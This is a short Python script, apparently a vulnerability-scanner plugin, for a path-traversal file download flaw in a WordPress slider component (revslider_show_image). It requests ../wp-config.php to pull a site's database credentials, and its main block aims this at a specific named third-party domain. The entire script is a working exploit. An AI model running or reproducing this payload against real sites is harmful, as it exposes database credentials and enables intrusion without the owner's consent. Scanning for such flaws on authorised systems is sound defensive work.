#!/usr/bin/env python
# -*- coding: utf-8 -*-
#title Wordpress Theme Arbitrary File Download Vulnerability
# PoC  http://target/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php


def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
    verify_url = arg  + payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    if  code== 200 and 'DB_NAME' in res and 'DB_USER' in res:
        security_hole(verify_url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.circlekcomm.com/')[1])
    # audit(assign('wordpress', 'http://www.example.com/')[1])